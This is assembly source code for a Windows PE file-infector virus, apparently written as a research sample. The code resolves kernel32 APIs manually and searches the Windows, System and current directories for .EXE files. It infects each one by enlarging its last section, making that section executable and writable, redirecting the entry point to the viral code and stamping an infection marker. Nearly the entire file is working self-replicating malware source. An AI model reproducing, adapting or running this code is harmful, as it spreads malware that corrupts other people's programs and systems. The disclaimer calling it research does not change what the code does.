;---------------------
;This is the Simple PE infection
;
;Name: lee ling chuan
;NickName:lclee_vx
;Company : Scan Associates 
;Website : http://www.scan-associates.net
;Forum : http://www.prisma-mampu.gov.my/listforum.do
;the code just for research purpose
;------------------
.386p
.model flat, stdcall
option casemap:none
jumps

extrn MessageBoxA:proc
extrn ExitProcess:proc

sz_unuse equ (offset virii - offset virii_start)
MyVirusSz equ (offset virii_end - offset virii_sz)
heap_sz equ (offset heap_end - offset heap_start)
total_sz equ (MyVirusSz+heap_sz)

.data
szMessage db "this is Ring3 Virus, Just For Research Purpose", 0
szTitle db "from lclee_vx, http://www.scan-associates.net", 0

FILETIME STRUC
FT_dwLowDateTime dd ?
FT_dwHighDateTime dd ?
FILETIME ENDS

.code

virii_sz label byte

virii_start:
call virii 
pushad 
pushfd 
virii:
pop ebp 
mov eax, ebp 
sub ebp, offset virii

sub eax, sz_unuse 
sub eax, 00001000h 

now_eip equ $-4 
mov dword ptr [ebp+appbase],eax

mov esi, [esp+24] 
xor edx, edx 
call k32base 
mov dword ptr [ebp+kernel], eax 

lea edi, [ebp + @@offset_api] 
lea esi, [esi + @@name_api] 
call get_apis 
call prepare_location 
call start_infect

xchg ebp, ecx 
jecxz SetSEH 

popfd
popad

mov eax, 12345678h
org $-4
old_eip dd 00001000h

add eax, 12345678h
org $-4
appbase dd 00400000h
jmp eax

;---------------------------------
;this portion is to get the kernel32.dll address
;------------------------
k32base proc
dec esi 
cmp word ptr [esi], "ZM" 
jne k32base
mov edx, [esi+03ch] 
cmp dword ptr [edx], "EP" 
jne k32base 
cmp esi, [esi+edx+34h] 
jnz k32base
xchg eax, esi 
ret
k32base endp

;@exit:
;ret

;------------------------------
;this portion is to get the api we want to run, :) ....excited?
;--------------------------
get_apis proc
@@step_1:
push esi 
push edi 
call get_api 
pop edi
pop esi

xor al, al 
stosd 
xchg edi, esi

@@step_2:
scasb
jnz @@step_2
xchg edi, esi

@@step_3:
cmp byte ptr [esi], 0AAh
jnz @@step_1
ret
get_apis endp

get_api proc
mov edx, esi
mov edi, esi

xor al, al

@step_1: scasb 
jnz @step_1

sub edi, esi
mov ecx, edi

xor eax, eax
mov esi, 3ch 
add esi, [ebp+kernel] 
lodsd
add eax, [ebp+kernel]

mov esi, [eax+78h] 
add esi, 1ch 
add esi, [ebp+kernel]

lea edi, [ebp+Address_of_func]
lodsd 
add eax, [ebp+kernel] 
stosd

lodsd 
add eax, [ebp+kernel] 
push eax 
stosd 

lodsd 
add eax, [ebp+kernel] 
stosd 
pop esi
xor ebx, ebx 

@step_2:
lodsd 
push esi 
add eax, [ebp+kernel]
mov esi, eax 
mov edi, edx
push ecx
cld
rep cmpsb 
pop ecx
jz @step_3 
pop esi 
inc ebx
jmp @step_2 

@step_3: pop esi 
xchg eax, ebx 
shl eax, 1 
add eax, dword ptr [ebp+Address_of_ordinals]
xor esi, esi 
mov esi, eax
lodsd
shl eax, 2 
add eax, dword ptr [ebp+Address_of_func] 
mov esi, eax
lodsd
add eax, [ebp+kernel] 
ret
get_api endp

;----------------
;prepare the location to scan
;--------------------
prepare_location proc
lea edi, [ebp+WinDir]
push 7Fh
push edi
call [ebp+_GetWindowsDirectoryA]

lea edi, [ebp+SysDir]
push 7Fh
push edi
call [ebp+_GetSystemDirectoryA]

lea edi, [ebp+CurrentDir]
push edi
push 7Fh
call [ebp+_GetCurrentDirectoryA]
ret
prepare_location endp

;-----------------
;let start to scan and looking for our needed file, heheheheheh :)
;---------------
start_infect: 
lea edi, [ebp+location]
mov byte ptr [ebp+Mirror], 04h 

set_location:
push edi
call [ebp+_SetCurrentDirectoryA] 

push edi
call go_infect
pop edi

add edi, 7Fh 

dec byte ptr [ebp+Mirror]
jnz set_location
ret

go_infect proc
and dword ptr [ebp+counter], 00000000h 

; lea eax, [ebp+offset find_data] 
lea eax, [ebp+offset WIN32_FIND_DATA]
push eax
lea eax, [ebp+offset Mark] 
push eax
call [ebp+_FindFirstFileA] 

inc eax 
jz Fail 
dec eax 

mov dword ptr [ebp+SearchHandle], eax

@go_infect1: push dword ptr [ebp+old_eip] 
push dword ptr [ebp+appbase] 

call infect 

pop dword ptr [ebp+appbase]
pop dword ptr [ebp+old_eip]

inc byte ptr [ebp+counter]
cmp dword ptr [ebp+counter], 0FFFFFFFFh 
jz Fail

@go_infect2: lea edi, [ebp+WFD_szFileName] 
mov ecx, max_path 
xor al, al 
rep stosb 

; lea eax, [ebp+offset find_data] 
lea eax, [ebp+offset WIN32_FIND_DATA]
push eax 
push dword ptr [ebp+SearchHandle] 
call [ebp+_FindNextFileA] 

test eax, eax
jnz @go_infect1 
endp go_infect

ClsSeachHandle:
push dword ptr [ebp+SearchHandle]
call [ebp+_FindClose]

Fail:
ret

;-------------------
;start infect. i use the "increase the last section" technic
;------------------
infect:
lea esi, [ebp+WFD_szFileName]
push 80h
push esi
call [ebp+_SetFileAttributesA]

call open_exe
inc eax 
jz fail_open 
dec eax

mov dword ptr [ebp+FileHandle], eax 
call file_mapping 

test eax, eax
jz file_close 

mov dword ptr [ebp+MapHandle], eax 

mov ecx, dword ptr [ebp+WFD_nFileSizeLow] 
call map_view 

test eax, eax 
jz unmap_view

mov eax, dword ptr [ebp+MapAddress] 

mov esi, [eax+3ch] 
add esi, eax 
cmp dword ptr [esi], "EP" 
jz cant_infect 

cmp dword ptr [esi+4ch], "LEE" 
jz cant_infect

push dword ptr [esi+3ch] 

push dword ptr [ebp+MapAddress] 
call [ebp+_UnmapViewOfFile]

push dword ptr [ebp+MapHandle]
call [ebp+_CloseHandle] 

pop ecx 

mov eax, dword ptr [ebp+WFD_nFileSizeLow] 
add eax, MyVirusSz 
add eax, 1000h 

call ReAlign 
xchg ecx, eax 

call file_mapping
test eax, eax 
jz file_close 

mov dword ptr [ebp+MapHandle], eax

mov ecx, dword ptr [ebp+NewFileSize]
call map_view

test eax, eax 
jz unmap_view

mov dword ptr [ebp+MapAddress], eax 
mov esi, [eax+3ch] 
add esi, eax 
mov edi, esi 

mov ebx, [esi+74h] 
shl ebx, 3 
sub eax, eax 
mov ax, word ptr [esi+6h] 
dec eax 
mov ecx, 28h 
mul ecx 
add esi, 78h 
add esi, ebx
add esi, eax 

mov eax, [edi+28h] 
mov dword ptr [ebp+old_eip], eax 
mov eax, [edi+34h] 
mov dword ptr [ebp+appbase], eax 

mov edx, [esi+10h] 
mov ebx, edx 
add edx, [esi+14h] 

push edx 

mov eax, ebx 
add eax, [esi+0ch] 

mov [edi+28h], eax 
mov dword ptr [ebp+now_eip], eax

mov eax, [esi+10h] 
add eax, MyVirusSz 
mov ecx, [edi+3ch] 

call ReAlign 
mov [esi+10h], eax 
mov [esi+08h], eax 
pop edx 

mov eax, [esi+10h] 
add eax, [esi+0ch] 
mov [edi+50h], eax 

or dword ptr [esi+24h], 00000020h 
or dword ptr [esi+24h], 20000000h 
or dword ptr [esi+24h], 80000000h 

mov dword ptr [edi+4ch], "LEE" 

lea esi, [ebp+virii_start] 
xchg edi, edx 

add edi, dword ptr [ebp+MapAddress] 
mov ecx, MyVirusSz 
rep movsb
jmp unmap_view

;-----------------
;this portion we open the file 
;----------------
open_exe proc
sub eax, eax 
push eax 
push eax 
push 00000003h 
push eax
push 00000001h
push 80000000h or 40000000h
push esi
call [ebp+_CreateFileA] 

ret
open_exe endp

;-----------------------
;this portion fail to open the file, we are going to set the old file attribute
;-----------------------
fail_open proc
push dword ptr [ebp+WFD_dwFileAttributes]
lea eax, [ebp+WFD_szFileName] 
push eax
call [ebp+_SetFileAttributesA]
ret
fail_open endp

;-----------------------
;map the file into memory
;----------------------
file_mapping proc
sub eax, eax 
push eax
lea ecx, dword ptr [ebp+WFD_nFileSizeLow]
push ecx
push eax
push 00000004h 
push eax
push dword ptr [ebp+FileHandle]
call [ebp+_CreateFileMappingA]
ret
file_mapping endp

;-----------------------
;so bad, we fail to map the file
;---------------------
file_close:
push dword ptr [ebp+FileHandle]
call [ebp+_CloseHandle]

;-----------------------
;this portion start function MapViewOfFile
;----------------------
map_view proc
push ecx
push 00000000h
push 00000000h
push 00000002h
push dword ptr [ebp+MapHandle]
call [ebp+_MapViewOfFile]

ret
map_view endp

;-----------------
;this portion for error of MapViewOfFile
;------------------------
unmap_view:
push dword ptr [ebp+MapAddress]
call [ebp+_UnmapViewOfFile]

;--------------------------
;this file cannot infect and will crash the system, we need to restore back all the variable
;--------------------------
cant_infect:
dec byte ptr [ebp+counter] 
mov ecx, dword ptr [ebp+WFD_nFileSizeLow] 
call original 

;--------------------
;this portion is to reassembly the original file when detected failed infection
;----------------
original proc
push 00000000h
push 00000000h 
push ecx
push dword ptr [ebp+FileHandle]
call [ebp+_SetFilePointer] 

push dword ptr [ebp+FileHandle]
call [ebp+_SetEndOfFile] 
ret 
original endp

;----------------------
;align the infected PE file
;eax=file size, ecx=file alignment
;---------------
ReAlign proc
push edx 
sub edx, edx 
push eax
div ecx 
pop eax
sub ecx,edx
add eax,ecx
pop edx
ret
ReAlign endp

;----------------
;all the variable 
;-----------------
;appbase dd 00400000h
kernel dd ?
Mark db "*.EXE", 0
counter dd 00000000h

@@name_api label byte
@FindFisrtFileA db "FindFirstFileA", 0
@FindNextFileA db "FindNextFileA", 0
@FindClose db "FindClose", 0
@SetFileAttributesA db "SetFileAttributesA", 0
@CreateFileA db "CreateFileA", 0
@CreateFileMappingA db "CreateFileMappingA", 0
@CloseHandle db "CloseHandle", 0
@MapViewOfFile db "MapViewOfFile", 0
@SetFilePointer db "SetFilePointer", 0
@GetWindowsDirectoryA db "GetWindowsDirectoryA", 0
@GetSystemDirectoryA db "GetSystemDirectoryA", 0
@GetCurrentDirectoryA db "GetCurrentDirectoryA", 0
@SetCurrentDirectoryA db "SetCurrentDirectoryA", 0
@UnmapViewOfFile db "UnmapViewOfFile", 0
@SetEndOfFile db "SetEndOfFile", 0
db 0AAh

virii_end label byte

heap_start label byte
max_path equ 260

SearchHandle dd 00000000h
Address_of_func dd 00000000h
Address_of_ordinals dd 00000000h
FileHandle dd 00000000h
MapHandle dd 00000000h
MapAddress dd 00000000h
NewFileSize dd 00000000h

location label byte
WinDir db 7Fh dup (00)
SysDir db 7Fh dup (00)
CurrentDir db 7Fh dup (00)
Level db (($-location)/7Fh)
Mirror equ Level

@@offset_api label byte
_FindFirstFileA dd 00000000h
_FindNextFileA dd 00000000h
_FindClose dd 00000000h
_SetFileAttributesA dd 00000000h
_CreateFileA dd 00000000h
_CreateFileMappingA dd 00000000h
_CloseHandle dd 00000000h
_MapViewOfFile dd 00000000h
_SetFilePointer dd 00000000h
_GetWindowsDirectoryA dd 00000000h
_GetSystemDirectoryA dd 00000000h
_GetCurrentDirectoryA dd 00000000h
_SetCurrentDirectoryA dd 00000000h
_UnmapViewOfFile dd 00000000h
_SetEndOfFile dd 00000000h


WIN32_FIND_DATA label byte
WFD_dwFileAttributes DD ?
WFD_ftCreationTime FILETIME ?
WFD_ftLastAccessTime FILETIME ?
WFD_ftLastWriteTime FILETIME ?
WFD_nFileSizeHigh DD ?
WFD_nFileSizeLow DD ?
WFD_dwReserved0 DD ?
WFD_dwReserved1 DD ?
WFD_szFileName DB max_path DUP (?)
WFD_szAlternateFileName DB 13 DUP (?)
DB 3 DUP (?) ; dword padding

SIZEOF_WIN32_FIND_DATA EQU SIZE WIN32_FIND_DATA 

heap_end label byte
;-------------
;popup the meessage
;----------------
SetSEH:
pop dword ptr fs:[0]
add esp, 4
popad
popfd

sub eax, eax
push eax
push offset szTitle
push offset szMessage
push eax
call MessageBoxA

sub eax, eax
push eax
call ExitProcess
end virii_start

;--------------------------
;Thanks, r00t, hackerboy, billy...ur tutorial wonderful.... :)
;--------------------